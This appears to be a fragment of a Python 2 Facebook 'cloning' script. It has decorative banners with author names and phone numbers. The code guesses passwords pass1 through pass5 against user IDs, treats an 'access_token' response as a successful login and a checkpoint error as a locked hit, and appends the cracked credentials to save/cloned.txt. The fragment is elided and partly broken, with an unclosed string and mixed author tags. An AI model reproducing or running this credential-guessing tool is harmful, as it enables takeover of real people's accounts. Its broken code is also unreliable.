...
\033[1;94mFACEBOOK  SUBHAN KHAN  DR D4D4
                  
\033[1;92mWHATAAPP   +923189339494
...
║ AUTHOR ✈✈✈SOBIA SADAF        ║✈ ✈║
║  GITHUB ✈✈✈ SOBIA SADAF        ║ ✈✈║
║ FACEBOOK ✈✈✈SOBIA SADAF[BROKEN]║ ✈✈║
║  YOUTUBE ✈✈✈ SADAF TRICKS     ║✈✈ ║
║   WHATSAPP ✈✈✈ +92318893944  ║ ✈✈║
╚══──────────────────────────╝─══╝
...
║GITHUB ✈✈✈SOBIA SADAF                
║FACEBOOK ✈✈✈SOBIA SADAF [BROKEN]              
║YOUTUBE ✈✈✈ SOBIA TRICKS
║WHATSAPP ✈✈✈  +923188939944             
╚══──────────────────────────╝─══╝
"""
print("""
Author: SOBIA SADAF
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[SADAF-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[SADAF-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[SADAF-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[SADAF-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[SADAF-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[SADAF-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[SADAF-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[SADAF-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SADAF-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SUBHAN-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mSADAF-S-KHAN"""
